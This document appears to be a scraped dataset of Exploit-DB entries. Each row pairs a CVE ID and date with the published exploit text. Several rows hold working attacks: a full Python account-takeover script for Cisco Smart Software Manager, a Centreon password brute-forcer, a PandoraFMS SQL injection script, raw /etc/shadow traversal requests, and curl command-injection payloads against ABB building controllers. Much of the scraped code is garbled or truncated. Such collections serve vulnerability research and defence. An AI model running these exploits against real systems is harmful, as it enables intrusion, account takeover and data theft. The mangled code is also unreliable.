CVE-2024-53582,"{""CVE-2024-53582"": 1}",2025-04-14,OpenPanel Copy and View functions in the File Manager 0.3.4 - Directory Traversal,https://www.exploit-db.com/exploits/52198,"Exploit Title: OpenPanel Copy and View functions in the File Manager 0.3.4 - Directory Traversal Date: Nov 25, 2024 Exploit Author: Korn Chaisuwan, Punthat Siriwan, Pongtorn Angsuchotmetee Vendor Homepage: <URL> Software Link: <URL> Version: 0.3.4 Tested on: macOS CVE : CVE-2024-53582 GET /viewfile?filename=shadow&pathparam=/etc HTTP/2 Host: demo.openpanel.org:2083 Cookie: session=eyJ1c2VyX2lkIjoxfQ.ZyyFtw.LmzkwVp2FF_x2AkdK5DVKigeef8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: <URL> Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers"
CVE-2024-47605,"{""CVE-2024-47605"": 1}",2025-04-14,SilverStripe 5.3.8  - Stored Cross Site Scripting (XSS) (Authenticated),https://www.exploit-db.com/exploits/52199,"Exploit Title: SilverStripe 5.3.8 - Stored Cross Site Scripting (XSS) (Authenticated) Date: 2025-01-15 Exploit Author: James Nicoll Vendor Homepage: <URL> Software Link: <URL> Category: Web Application Version: 5.2.22 Tested on: SilverStripe 5.2.22 - Ubuntu 24.04 CVE : CVE-2024-47605 #Explanation: When using the ""insert media"" functionality, the linked oEmbed JSON includes an HTML attribute which will replace the embed shortcode. The HTML is not sanitized before replacing the shortcode, allowing a script payload to be executed on both the CMS and the front-end of the website. #Requirements 1. A Silverstripe CMS website. 2. Valid login credentials for a user with page edit rights. 3. An attacker server hosting malicious payload. #On the attacker server: 1. Create an html file with oembded information: 2. Create the json file with XSS payload: ""title"": ""Title"", ""authorname"": ""author"", ""type"": ""video"", ""height"": 113, ""width"": 200, ""version"": ""1.0"", ""providername"": ""FakeSite"", ""thumbnailheight"": 360, ""thumbnailwidth"": 480, ""thumbnail_url"": "" <URL> ""html"":"" "" 3. The media.jpg file can be any image. 4. Host these files on a publicly available website #On the SilverStripe website: 1. Log into the admin portal with a user account that has page editor rights (or higher). 2. Select the page you wish to load the malicious content into. 3. Within the editor panel, select the ""Insert Media via URL"" button. 4. Enter the IP/Hostname of the attacker server. 5. Click Add Media, Insert Media, and then save and publish the page."
CVE-2024-51774,"{""CVE-2024-51774"": 1}",2025-04-11,qBittorrent 5.0.1 - MITM RCE,https://www.exploit-db.com/exploits/52190,Exploit Title: qBittorrent 5.0.1 MITM RCE Date: 01/02/2025 Exploit Author: Jordan Sharp Vendor Homepage: <URL> Software Link: <URL> Version: < 5.0.1 Tested on: Windows 10 CVE : CVE-2024-51774 Run the
CVE-2019-13961,"{""CVE-2019-13961"": 1}",2025-04-11,flatCore 1.5 - Cross Site Request Forgery (CSRF),https://www.exploit-db.com/exploits/52166,Exploit Title: flatCore 1.5 - Cross Site Request Forgery (CSRF) Date: 2024-10-26 Exploit Author: CodeSecLab Vendor Homepage: <URL> Software Link: <URL> Version: d3a5168 Tested on: Ubuntu Windows CVE : CVE-2019-13961
CVE-2020-18662,"{""CVE-2020-18662"": 1}",2025-04-11,Gnuboard5 5.3.2.8 - SQL Injection,https://www.exploit-db.com/exploits/52167,Exploit Title: Gnuboard5 5.3.2.8 - SQL Injection Date: 2024-10-26 Exploit Author: CodeSecLab Vendor Homepage: <URL> Software Link: <URL> Version: 5.3.2.8 Tested on: Ubuntu Windows CVE : CVE-2020-18662
CVE-2021-28976,"{""CVE-2021-28976"": 1}",2025-04-11,GetSimpleCMS 3.3.16 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52168,Exploit Title: GetSimpleCMS 3.3.16 - Remote Code Execution (RCE) Date: 2024-10-26 Exploit Author: CodeSecLab Vendor Homepage: <URL> Software Link: <URL> Version: 3.3.16 Tested on: Ubuntu Windows CVE : CVE-2021-28976
CVE-2021-44567,"{""CVE-2021-44567"": 1}",2025-04-11,RosarioSIS 7.6 - SQL Injection,https://www.exploit-db.com/exploits/52169,Exploit Title: RosarioSIS 7.6 - SQL Injection Date: 2024-10-26 Exploit Author: CodeSecLab Vendor Homepage: <URL> Software Link: <URL> Version: 7.6 Tested on: Ubuntu Windows CVE : CVE-2021-44567
CVE-2023-30258,"{""CVE-2023-30258"": 1}",2025-04-11,MagnusSolution magnusbilling 7.3.0 - Command Injection,https://www.exploit-db.com/exploits/52170,Exploit Title: MagnusSolution magnusbilling 7.3.0 - Command Injection Date: 2024-10-26 Exploit Author: CodeSecLab Vendor Homepage: <URL> Software Link: <URL> Version: 7.3.0 Tested on: Centos CVE : CVE-2023-30258
CVE-2024-8522,"{""CVE-2024-8522"": 1}",2025-04-11,LearnPress WordPress LMS Plugin 4.2.7 - SQL Injection,https://www.exploit-db.com/exploits/52171,"Exploit Title: LearnPress WordPress LMS Plugin 4.2.7 - SQL Injection Google Dork: inurl:""/wp-json/learnpress/v1/"" OR inurl:""/wp-content/plugins/learnpress/"" OR ""powered by LearnPress"" AND ""version 4.2.7"" Date: [Current Date, e.g., October 30, 2024] Exploit Author: [Your Name or Username] Vendor Homepage: <URL> Software Link: <URL> Version: <= 4.2.7 Tested on: WordPress 6.x, Ubuntu 22.04 CVE : CVE-2024-8522CVE-2024-8522 - SQL Injection in LearnPress WordPress Plugin (Python exploit) Overview CVE: CVE-2024-8522 Plugin: LearnPress – WordPress LMS Plugin (version <= 4.2.7) Type: SQL Injection Impact: High Affected Component: Unauthenticated endpoint parameter conlyfields in LearnPress API Description The vulnerability exists in the LearnPress WordPress plugin, versions up to 4.2.7. An unauthenticated SQL Injection flaw is present in the conlyfields parameter of the LearnPress API endpoint. This flaw allows attackers to execute arbitrary SQL commands by manipulating API requests without authentication. If exploited, this could lead to unauthorized database access, potentially exposing sensitive data or even allowing administrative control through database manipulation. Affected Code Path The vulnerability is triggered by accessing the LearnPress API and injecting SQL commands through the conlyfields parameter. Below is the code path leading to this vulnerability: plaintext class-lp-db.php:702, LPDatabase->execute() class-lp-course-db.php:564, LPCourseDB->getcourses() Courses.php:241, LearnPress\Models\Courses::getcourses() class-lp-rest-courses-v1-controller.php:502, LPJwtCoursesV1Controller->getcourses() class-wp-rest-server.php:1230, WPRESTServer->respondtorequest() class-wp-rest-server.php:1063, WPRESTServer->dispatch() Proof of Concept ("
CVE-2024-51378,"{""CVE-2024-51378"": 1}",2025-04-11,CyberPanel 2.3.6 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52172,"Exploit Title: CyberPanel 2.3.6 - Remote Code Execution (RCE) Date: 10/29/2024 Exploit Author: Luka Petrovic (refr4g) Vendor Homepage: <URL> Software Link: <URL> Version: 2.3.5, 2.3.6, 2.3.7 (before patch) Tested on: Ubuntu 20.04, CyberPanel v2.3.5, v2.3.6, v2.3.7 (before patch) CVE: CVE-2024-51378"
CVE-2024-37383,"{""CVE-2024-37383"": 1}",2025-04-11,Roundcube Webmail 1.6.6 - Stored Cross Site Scripting (XSS),https://www.exploit-db.com/exploits/52173,"Exploit Title: Roundcube Webmail 1.6.6 - Stored Cross Site Scripting (XSS) Google Dork: Exploit Author: AmirZargham Vendor Homepage: Roundcube - Free and Open Source Webmail Software Software Link: Releases · roundcube/roundcubemail Version: Roundcube client version earlier than 1.5.6 or from 1.6 to 1.6.6. Tested on: firefox,chrome CVE: CVE-2024-37383 CWE: CWE-79 Platform: MULTIPLE Type: WebApps Description: The CVE-2024-37383 vulnerability was discovered in the Roundcube Webmail email client. This is a stored XSS vulnerability that allows an attacker to execute JavaScript code on the user's page. To exploit the vulnerability, all attackers need to do is open a malicious email using a Roundcube client version earlier than 1.5.6 or from 1.6 to 1.6.6. Usage Info:1 - open the Roundcubemailserverexploitfor_CVE-2024-37383.txt and export js file.2 - Change the web address of the original email (target) and the URL of the receiving server (attacker server).3 - You can put the code in file SVG tag and send it to the server. (can use this <URL>"
CVE-2024-10758,"{""CVE-2024-10758"": 1}",2025-04-11,NEWS-BUZZ News Management System 1.0 - SQL Injection,https://www.exploit-db.com/exploits/52174,"Exploit Title: NEWS-BUZZ News Management System 1.0 - SQL Injection Google Dork: N/A Exploit Author: egsec Date: 2024-11-03 Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows 11 Pro Impact: The manipulation of the argument user_name with an unknown input leads to a sql injection vulnerability CVE : CVE-2024-10758 #Vulnerability Description: There is a SQL injection vulnerability in the login part of the index.php file. It allows an attacker to manipulate the SQL query and potentially perform unauthorized actions on the database. #Vulnerable code section: In the source code, you can find vulnerable code in the NEWS-BUZZ/login.php file: In this line, the $username variable is directly embedded into the SQL query without proper handling. This allows an attacker to inject malicious SQL code. #Proof of Concept ("
CVE-2018-1000638,"{""CVE-2018-1000638"": 1}",2025-04-11,MiniCMS 1.1 - Cross Site Scripting (XSS),https://www.exploit-db.com/exploits/52175,Exploit Title: MiniCMS 1.1 - Cross Site Scripting (XSS) Date: 2024-10-26 Exploit Author: CodeSecLab Vendor Homepage: <URL> Software Link: <URL> Version: 1.10 Tested on: Ubuntu Windows CVE : CVE-2018-1000638
CVE-2023-24657,"{""CVE-2023-24657"": 1}",2025-04-11,phpIPAM 1.6 - Reflected Cross Site Scripting (XSS),https://www.exploit-db.com/exploits/52176,Exploit Title: phpIPAM 1.6 - Reflected Cross Site Scripting (XSS) Date: 2024-10-26 Exploit Author: CodeSecLab Vendor Homepage: <URL> Software Link: <URL> Version: 1.5.1 Tested on: Ubuntu Windows CVE : CVE-2023-24657
CVE-2024-53586,"{""CVE-2024-53586"": 1}",2025-04-11,WebFileSys 2.31.0 - Directory Path Traversal,https://www.exploit-db.com/exploits/52185,"Exploit Title: WebFileSys 2.31.0 - Directory Path Traversal in relPath Parameter Date: Nov 25, 2024 Exploit Author: Korn Chaisuwan, Charanin Thongudom, Pongtorn Angsuchotmetee Vendor Homepage: <URL> Software Link: <URL> Version: 2.31.0 Tested on: macOS CVE : CVE-2024-53586 GET /webfilesys/servlet?command=mobile&cmd=folderFileList&initial=true&relPath=/../../.. HTTP/1.1 Host: <URL> Cookie: JSESSIONID=BE9434E13C7CDE33D00D6F484F64EFB8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: <URL> Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Priority: u=0, i Te: trailers Connection: keep-alive"
CVE-2024-56901,"{""CVE-2024-56901"": 1}",2025-04-11,GeoVision GV-ASManager 6.1.1.0 - CSRF,https://www.exploit-db.com/exploits/52187,"Exploit Title: GeoVision GV-ASManager 6.1.1.0 - CSRF Google Dork: inurl:""ASWeb/Login"" Date: 02-FEB-2025 Exploit Author: Giorgi Dograshvili [DRAGOWN] Vendor Homepage: <URL> Software Link: <URL> Version: 6.1.1.0 or less Tested on: Windows 10 | Kali Linux CVE : CVE-2024-56901"
CVE-2024-56898,"{""CVE-2024-56898"": 1}",2025-04-11,GeoVision GV-ASManager 6.1.0.0 - Broken Access Control,https://www.exploit-db.com/exploits/52189,"Exploit Title: Broken Access Control in GeoVision GV-ASManager Google Dork: inurl:""ASWeb/Login"" Date: 02-FEB-2025 Exploit Author: Giorgi Dograshvili [DRAGOWN] Vendor Homepage: <URL> Software Link: <URL> Version: 6.1.0.0 or less Tested on: Windows 10 | Kali Linux CVE : CVE-2024-56898"
CVE-2024-48852,"{""CVE-2024-48852"": 1}",2025-04-11,ABB Cylon FLXeon 9.3.4 - System Logs Information Disclosure,https://www.exploit-db.com/exploits/52178,"Exploit Tiltle: ABB Cylon FLXeon 9.3.4 - System Logs Information Disclosure Vendor: ABB Ltd. Product web page: <URL> Affected version: FLXeon Series (FBXi Series, FBTi Series, FBVi Series) CBX Series (FLX Series) CBT Series CBV Series Firmware: <=9.3.4 Summary: BACnet Smart Building Controllers. ABB's BACnet portfolio features a series of BACnet IP and BACnet MS/TP field controllers for ASPECT and INTEGRA building management solutions. ABB BACnet controllers are designed for intelligent control of HVAC equipment such as central plant, boilers, chillers, cooling towers, heat pump systems, air handling units (constant volume, variable air volume, and multi-zone), rooftop units, electrical systems such as lighting control, variable frequency drives and metering. The FLXeon Controller Series uses BACnet/IP standards to deliver unprecedented connectivity and open integration for your building automation systems. It's scalable, and modular, allowing you to control a diverse range of HVAC functions. Desc: An authenticated attacker can access sensitive information via the system logs page of ABB Cylon FLXeon controllers. The logs expose critical data, including the OpenSSL password for stored certificates. This information can be leveraged for further attacks, such as decrypting encrypted communications, impersonation, or gaining deeper system access. Tested on: Linux Kernel 5.4.27 Linux Kernel 4.15.13 NodeJS/8.4.0 Express Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2025-5920 Advisory URL: <URL> CVE ID: CVE-2024-48852 CVE URL: <URL> 21.04.2024 $ cat project P R O J E C T $ curl -k "" <URL> \ JS > /diagnostics/logs-system (platform-dist) > -H ""Cookie: usersid=xxx"" \ > -d ""{\""cmd\"":\""journalctl -b -r --no-hostname ^| head -c 600000 \""}"" -- Logs begin at Thu 2024-06-13 10:58:03 EDT, end at Mon 2024-09-09 09:10:33 EDT. -- Feb 13 12:38:26 node[5810]: at endReadableNT (streamreadable.js:1059:12) Feb 13 12:38:26 node[5810]: at IncomingMessage.emit (events.js:207:7) Feb 13 12:38:26 node[5810]: at emitNone (events.js:105:13) Feb 13 12:38:26 node[5810]: at IncomingMessage.onEnd (/home/MIXCMIX/node-server/nodemodules/raw-body/index.js:273:7) Feb 13 12:38:26 node[5810]: at done (/home/MIXCMIX/node-server/nodemodules/raw-body/index.js:213:7) Feb 13 12:38:26 node[5810]: at invokeCallback (/home/MIXCMIX/node-serve""} Sep 09 09:10:33 node[5810]: cmd = openssl req -x509 -passin pass:c*2 -key /usr/local/aam/node-server//certs/cbxi.key.pem -new -sha256 -out /usr/local/aam/node-server//certs/cbxi.cert.pem -subj ""/C=IE/ST=/L=Dublin/O=Cylon Controls/OU=/CN="" Sep 09 09:08:18 node[5810]: cmd = openssl req -x509 -passin pass:c*2 -key /usr/local/aam/node-server//certs/cbxi.key.pem -new -sha256 -out /usr/local/aam/node-server//certs/cbxi.cert.pem -subj ""/C=IE/ST=/L=Dublin/O=Cylon Controls/OU=/CN="" Sep 09 09:00:12 node[5810]: Error: ENOENT: no such file or directory, stat '/usr/local/aam/node-server/certs/cbxi.csr.pem' Sep 09 08:59:58 node[5810]: Error: ENOENT: no such file or directory, stat '/usr/local/aam/node-server/certs/cbxi.csr.pem' Sep 09 08:59:41 node[5810]: Error: ENOENT: no such file or directory, stat '/usr/local/"
CVE-2024-48849,"{""CVE-2024-48849"": 1}",2025-04-11,ABB Cylon FLXeon 9.3.4 - WebSocket Command Spawning,https://www.exploit-db.com/exploits/52184,ABB Cylon FLXeon 9.3.4 (wsConnect.js) WebSocket Command Spawning
CVE-2024-48841,"{""CVE-2024-48841"": 1}",2025-04-11,ABB Cylon FLXeon 9.3.4 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52186,"Exploit title: ABB Cylon FLXeon 9.3.4 - Remote Code Execution (RCE) Vendor: ABB Ltd. Product web page: <URL> Affected version: FLXeon Series (FBXi Series, FBTi Series, FBVi Series) CBX Series (FLX Series) CBT Series CBV Series Firmware: <=9.3.4 Summary: BACnet Smart Building Controllers. ABB's BACnet portfolio features a series of BACnet IP and BACnet MS/TP field controllers for ASPECT and INTEGRA building management solutions. ABB BACnet controllers are designed for intelligent control of HVAC equipment such as central plant, boilers, chillers, cooling towers, heat pump systems, air handling units (constant volume, variable air volume, and multi-zone), rooftop units, electrical systems such as lighting control, variable frequency drives and metering. The FLXeon Controller Series uses BACnet/IP standards to deliver unprecedented connectivity and open integration for your building automation systems. It's scalable, and modular, allowing you to control a diverse range of HVAC functions. Desc: The ABB Cylon FLXeon BACnet controller is vulnerable to authenticated remote root code execution via the /api/users/password endpoint. An attacker with valid credentials can inject arbitrary system commands by manipulating the newPassword PUT parameter. The issue arises in users.js, where the new password is hashed and improperly escaped before being passed to ChildProcess.exec() within a usermod command, allowing out of band (blind) command injection. Tested on: Linux Kernel 5.4.27 Linux Kernel 4.15.13 NodeJS/8.4.0 Express Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2025-5912 Advisory URL: <URL> CVE ID: CVE-2024-48841 CVE URL: <URL> 21.04.2024 $ cat project P R O J E C T $ curl -k -X PUT "" <URL> \ > -H ""Cookie: user_sid=xxx"" \ > -H ""Content-Type: application/json"" \ > --data '{""oldPassword"":""KAKA"",""newPassword"":""ZULUsleep 7""}'"
CVE-2024-48841,"{""CVE-2024-48841"": 1}",2025-04-11,ABB Cylon FLXeon 9.3.4 - Remote Code Execution (Authenticated),https://www.exploit-db.com/exploits/52188,"Exploit Title: ABB Cylon FLXeon 9.3.4 - Remote Code Execution (Authenticated) Vendor: ABB Ltd. Product web page: <URL> Affected version: FLXeon Series (FBXi Series, FBTi Series, FBVi Series) CBX Series (FLX Series) CBT Series CBV Series Firmware: <=9.3.4 Summary: BACnet Smart Building Controllers. ABB's BACnet portfolio features a series of BACnet IP and BACnet MS/TP field controllers for ASPECT and INTEGRA building management solutions. ABB BACnet controllers are designed for intelligent control of HVAC equipment such as central plant, boilers, chillers, cooling towers, heat pump systems, air handling units (constant volume, variable air volume, and multi-zone), rooftop units, electrical systems such as lighting control, variable frequency drives and metering. The FLXeon Controller Series uses BACnet/IP standards to deliver unprecedented connectivity and open integration for your building automation systems. It's scalable, and modular, allowing you to control a diverse range of HVAC functions. Desc: The ABB Cylon FLXeon BACnet controller is vulnerable to authenticated remote root code execution via the /api/timeConfig endpoint. An attacker with valid credentials can inject arbitrary system commands by manipulating parameters such as tz, timeServerYN, and multiple timeDate fields. The vulnerability exists due to improper input validation in timeConfig.js, where user-supplied data is executed via ChildProcess.exec() without adequate sanitization. Tested on: Linux Kernel 5.4.27 Linux Kernel 4.15.13 NodeJS/8.4.0 Express Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2025-5910 Advisory URL: <URL> CVE ID: CVE-2024-48841 CVE URL: <URL> 21.04.2024 $ cat project P R O J E C T $ curl -k -X PUT "" <URL> \ > -H ""Cookie: user_sid=xxx"" \ > -H ""Content-Type: application/json"" \ > -d '{""timeConfig"":{""timeDate"":{\ > ""yy"":""sleep 17"",\ > ""mm"":""sleep 17"",\ > ""dd"":""sleep 17"",\ > ""h"":""sleep 17"",\ > ""m"":""sleep 17"",\ > ""s"":""sleep 17""},\ > ""tz"":""sleep 17"",\ > ""tzList"":[],\ > ""timeServerYN"":""sleep 17"",\ > ""timeServer"":""1.1.1.1"",\ > ""timeServerSync"":false}}'"
CVE-2024-36424,"{""CVE-2024-36424"": 1}",2025-04-10,K7 Ultimate Security K7RKScan.sys 17.0.2019 - Denial Of Service (DoS),https://www.exploit-db.com/exploits/52158,"Exploit Title: K7 Ultimate Security K7RKScan.sys 17.0.2019 - Denial Of Service (DoS) Date: 13.08.2024 Author: M. Akil Gündoğan Vendor Homepage: <URL> Version: < v17.0.2019 Tested on: Windows 10 Pro x64 CVE ID: CVE-2024-36424 Vulnerability Description: In K7 Ultimate Security < v17.0.2019, the driver file (K7RKScan.sys - this version 15.1.0.7) allows local users to cause a denial of service (BSOD) or possibly have unspecified other impact because of null pointer dereference from IOCtl 0x222010 and 0x222014. At the same time, the drive is accessible to all users in the ""Everyone"" group. Technical details and step by step Proof of Concept's ("
CVE-2024-6039,"{""CVE-2024-6039"": 1}",2025-04-10,Feng Office 3.11.1.2 - SQL Injection,https://www.exploit-db.com/exploits/52154,"Exploit Title: Feng Office 3.11.1.2 - SQL Injection Date: 7/2024 Exploit Author: Andrey Stoykov Version: 3.11.1.2 Tested on: Ubuntu 22.04 Blog: <URL> SQL Injection: 1. Login to application 2. Click on ""Workspaces"" 3. Copy full URL 4. Paste the HTTP GET request into text file 5. Set the injection point to be in the ""dim"" parameter value 6. Use SQLMap to automate the process sqlmap -r request.txt --threads 1 --level 5 --risk 3 --dbms=3Dmysql -p dim = --fingerprint [12:13:03] [INFO] confirming MySQL [12:13:04] [INFO] the back-end DBMS is MySQL [12:13:04] [INFO] actively fingerprinting MySQL [12:13:05] [INFO] executing MySQL comment injection fingerprint web application technology: Apache back-end DBMS: active fingerprint: MySQL >=3D 5.7 comment injection fingerprint: MySQL 5.7.37"
CVE-2024-20419,"{""CVE-2024-20419"": 1}",2025-04-10,Cisco Smart Software Manager On-Prem 8-202206 - Account Takeover,https://www.exploit-db.com/exploits/52155,"Exploit Title: Cisco Smart Software Manager On-Prem 8-202206 - Account Takeover Google Dork: N/A Date: 21/07/2024 Exploit Author: Mohammed Adel Vendor Homepage: <URL> Software Link: <URL> Version: 8-202206 and earlier Tested on: Kali Linux CVE : CVE-2024-20419 Security Advisory: <URL> Technical Analysis: <URL> import requests, sys from urllib.parse import unquote Suppress SSL warnings requests.packages.urllib3.disablewarnings() Domain = sys.argv[1] Domain, <URL> Username = sys.argv[2] Username, by default its [admin] password = ""Polar"" print(""[*] Cisco Smart Software Manager On-Prem"") print(""[*] Account Takeover Exploit"") print(""[*] Target: ""+Domain) print(""[*] Username: ""+Username) print(""\n"") print(""[*] Getting Necessary Tokens.."") geturl = Domain+""/backend/settings/oauthadfs?hostname=polar"" response = requests.get(geturl, verify=False) def getcookievalue(headers, cookiename): cookies = headers.get('Set-Cookie', '').split(',') for cookie in cookies: if cookiename in cookie: parts = cookie.split(';') for part in parts: if cookiename in part: return part.split('=')[1].strip() return None setcookieheaders = response.headers.get('Set-Cookie', '') xsrftoken = getcookievalue(response.headers, 'XSRF-TOKEN') licenginesession = getcookievalue(response.headers, 'licenginesession') if xsrftoken: xsrftoken = unquote(xsrftoken) if not licenginesession or not xsrftoken: print(""Required cookies not found in the response."") else: print(""[+] licenginesession: ""+licenginesession) print(""[+] xsrftoken: ""+xsrftoken) print(""\n[*] Generating Auth Token"") posturl = Domain+""/backend/resetpassword/generatecode"" headers = { 'Accept': 'application/json', 'Content-Type': 'application/json', 'X-Xsrf-Token': xsrftoken, 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Mobile': '?0', cookies = { 'licenginesession': licenginesession, 'XSRF-TOKEN': xsrftoken, payload = { 'uid': Username postresponse = requests.post(posturl, headers=headers, cookies=cookies, json=payload, verify=False) postresponsejson = postresponse.json() authtoken = postresponsejson.get('authtoken') if not authtoken: print(""authtoken not found in the response."") else: print(""[+] Auth Token: ""+authtoken) print(""\n[*] Setting Up a New Password"") finalposturl = Domain+""/backend/resetpassword"" finalheaders = { 'Accept': 'application/json', 'Content-Type': 'application/json', 'X-Xsrf-Token': xsrftoken, finalcookies = { 'licenginesession': licenginesession, 'XSRF-TOKEN': xsrftoken, finalpayload = { 'uid': Username, 'authtoken': authtoken, 'password': password, 'passwordconfirmation': password, 'commonname': '' finalpostresponse = requests.post(finalposturl, headers=finalheaders, cookies=finalcookies, json=finalpayload, verify=False) responsetext = finalpostresponse.text if ""OK"" in responsetext: print(""[+] Password Successfully Changed!"") print(""[+] Username: ""+Username) print(""[+] New Password: ""+password) else: print(""[!] Something Went Wrong"") print(responsetext)"
CVE-2019-13024,"{""CVE-2019-13024"": 1}",2025-04-10,Centron 19.04 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52156,"Exploit Title : Centron 19.04 - Remote Code Execution (RCE) Tested on Centreon API 19.04.0 Centreon 19.04 - Login Password Bruteforcer Written on 6 Nov 2019 Referencing API Authentication of the Centreon API document Author: st4rry centbruteon.py Centreon Download Link: <URL> Dependencies: sys, requests, argparse, termcolor, os #!/usr/bin/env python3 import sys import requests import argparse from termcolor import colored import os def main(): parser = argparse.ArgumentParser() parser.addargument('-u', dest='host', help='Define your target URL', required=True) parser.addargument('-p', dest='port', type=int, help='Specify port number', default=80) parser.addargument('--https', dest='https', action='storetrue', help='Use HTTPS instead of HTTP') parser.addargument('-l', dest='username', help='Specific username') parser.addargument('-L', dest='userfile', type=argparse.FileType('r'), help='Username wordlist') parser.addargument('-w', dest='passwfile', type=argparse.FileType('r'), help='Specify Password wordlist', required=True) parser.addargument('--insecure', action='storetrue', help='Skip SSL certificate verification') parser.addargument('--ca-bundle', dest='cabundle', help='Path to custom CA bundle') if len(sys.argv) == 1: parser.printhelp(sys.stderr) sys.exit(1) args = parser.parseargs() protocol = 'https' if args.https else 'http' server = f""{protocol}://{args.host}:{args.port}"" user = args.username passfile = args.passwfile.read().splitlines() userfile = args.userfile dirlo = '/centreon/api/index.php?action=authenticate' verifyssl = not args.insecure if args.cabundle: verifyssl = args.cabundle if user: bruteforcesingleuser(server, user, passfile, dirlo, verifyssl) elif userfile: usrwl = userfile.read().splitlines() bruteforcemultipleusers(server, usrwl, passfile, dirlo, verifyssl) else: print(colored('Something went wrong!', 'red')) sys.exit(1) def bruteforcesingleuser(server, user, passfile, dirlo, verifyssl): for password in passfile: data = {'username': user, 'password': password} r = requests.post(f'{server}{dirlo}', data=data, verify=verifyssl) try: print('Processing.') print(colored('Brute forcing on Server: ', 'yellow') + colored(server, 'yellow') + colored(' Username: ', 'yellow') + colored(user, 'yellow') + colored(' Password: ', 'yellow') + colored(password, 'yellow')) if r.statuscode == 200: print(colored('Credentials found: username: ', 'green') + colored(user, 'green') + colored(' password: ', 'green') + colored(password, 'green') + colored(' server: ', 'green') + colored(server, 'green')) print(colored('Token: ', 'cyan') + colored(r.content.decode(), 'cyan')) print('\n') break else: print(colored('403 - Unauthenticated!', 'red')) except IndexError: print(colored('Something went wrong', 'red')) def bruteforcemultipleusers(server, usrwl, passfile, dirlo, verifyssl): for usr in usrwl: for password in passfile: data = {'username': usr, 'password': password} r = requests.post(f'{server}{dirlo}', data=data, verify=verifyssl) try: print('Processing.') print(colored('Brute forcing on Server: ', 'yellow') + colored(server, 'yellow') + colored(' Username: ', 'yellow') + colored(usr, 'yellow') + colored(' Password: ', 'yellow') + colored(password, 'yellow')) if r.statuscode == 200: print(colored('Credentials found: username: ', 'green') + colored(usr, 'green') + colored(' password: ', 'green') + colored(password, 'green') + colored(' server: ', 'green') + colored(server, 'green')) print(colored('Token: ', 'cyan') + colored(r.content.decode(), 'cyan')) print('\n') else: print(colored('403 - Unauthenticated!', 'red')) except IndexError: print(colored('Something went wrong', 'red')) if name == 'main_': main()"
CVE-2023-44088,"{""CVE-2023-44088"": 1}",2025-04-10,PandoraFMS 7.0NG.772 - SQL Injection,https://www.exploit-db.com/exploits/52157,"Exploit Title: PandoraFMS 7.0NG.772 - SQL Injection Date: 21/11/2023 Exploit Author: Osama Yousef Vendor Homepage: <URL> Software Link: <URL> Version: v7.0NG.772 Tested on: Linux CVE : CVE-2023-44088 import re, requests, argparse, string, random, base64 import urllib3 import html headers = { 'Cache-Control': 'max-age=0', 'Origin': '', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36', 'Accept': '/', 'Referer': '' def login(session, url, username, password): res = session.get(url) csrf = retrievecsrftoken(res.text) url+= '?login=1' payload = ""nick={}&pass={}&loginbutton=Let%27s+go&csrfcode={}"" res = session.post(url, data=payload.format(username, password, csrf), headers={'Content-Type': 'application/x-www-form-urlencoded'}) if 'User is blocked' in res.text: print(""Login Failed!"") exit(1) def exploit(session, url, imagepath, query): url1 = url + ""?sec=network&sec2=godmode/reporting/visualconsolebuilder&tab=data"" name = randomid(10) payload = ""{}.jpg',({}),'1','1','1','1');-- helloo.jpg"".format(name, query) payload=payload.replace(' ', '\t') files = {""backgroundimage"": (payload, open(imagepath, 'rb').read(), 'image/jpeg')} Create a reference to the original makerequest method urllib3.connectionpool.HTTPConnectionPool.originalmakerequest = urllib3.connectionpool.HTTPConnectionPool.makerequest Replace the makerequest method with the custommakerequest function urllib3.connectionpool.HTTPConnectionPool.makerequest = custommakerequest res = session.post(url1, files=files, data={'action':'save', 'name':name, 'idgroup': 0, 'backgroundimage': 'None.png', 'backgroundcolor': 'ffffff', 'width': '1024', 'height': '768', 'isfavouritesent': '0', 'autoadjustsent': '0', 'updatelayout': 'Save'}) if 'Created successfully' not in res.text: print(""Failed to create a visual console!"") exit(1) url2 = url + ""?sec=godmode/reporting/mapbuilder&sec2=godmode/reporting/mapbuilder"" res = session.get(url2) x = re.search('(?: )'+name, res.text) match = x.group() url3 = match.lstrip(""<a href="") url3 = url3.split('""')[1] url3 = url3.split(""?"")[1] url3 = html.unescape(url3) url4 = url+ ""?"" + url3 res = session.get(url4) x = re.search('(?:var props = {""autoAdjust"":true,""backgroundColor"":""."",""backgroundImage"")', res.text) match = x.group() output = match.lstrip('var props = {""autoAdjust"":true,""backgroundColor"":""') output = output.split('"",""backgroundImage')[0] print(""Query output: {}"".format(output)) def retrieve_csrftoken(response): x = re.search('(?:<input id=""hidden-csrf_code"" name=""csrf_code"" type=""hidden"" value="")[a-zA-Z0-9](?:"")', response) match = x.group() csrf = match.lstrip('<input id=""hidden-csrfcode"" name=""csrfcode"" type=""hidden"" value=""').rstrip('""') print(""CSRF: {}"".format(csrf)) return csrf def randomid(len): chars = string.asciiuppercase + string.asciilowercase + string.digits return ''.join(random.choice(chars) for in range(len)) def custommakerequest(self, conn, method, url, timeout=urllib3.connectionpool.Default, chunked=False, **httplibrequestkw): body = httplibrequestkw['body'] if body: body = body.replace(b""%09"", b""\t""*3) httplibrequestkw['body'] = body return 